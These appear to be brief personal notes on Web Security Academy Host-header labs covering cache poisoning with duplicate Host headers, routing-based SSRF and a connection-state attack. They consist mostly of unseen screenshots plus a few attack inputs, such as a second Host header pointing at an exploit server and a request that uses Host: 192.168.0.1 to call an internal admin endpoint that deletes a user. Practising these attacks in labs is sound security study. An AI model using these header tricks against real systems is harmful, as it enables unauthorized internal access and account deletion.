____
# Web cache poisoning via ambiguous requests


```
Host: 0a4300ef0342c1148188845d00e100e5.h1-web-security-academy.net
Host: exploit-0aa3008c0314c1e4811283cb01df00f2.exploit-server.net
```

# Routing-based SSRF

![Captura](../../../../assets/images/reference/9c4de563a165c9be7421.png)

![Captura](../../../../assets/images/reference/66ba6b6bb61b6e5f1308.png)

# SSRF via flawed request parsing

![Captura](../../../../assets/images/reference/d90e98e70372602f59af.png)

Check connection 

![Captura](../../../../assets/images/reference/8e2abdb8a204231e6c2d.png)

Delete user

![Captura](../../../../assets/images/reference/ad42894891d234368128.png)

# Host validation bypass via connection state attack

![Captura](../../../../assets/images/reference/23647692276024ed69aa.png)

First tab
- Path /
- Host: 0a3b00d903aa3c6180777b6f0009004a.h1-web-security-academy.net
- Connection: keep-alive

Second tab
- Path /admin/delete?csrf=hKkau3D86P0GZlrXeFcX5i5XX0azUEio&username=carlos
- Host: 192.168.0.1
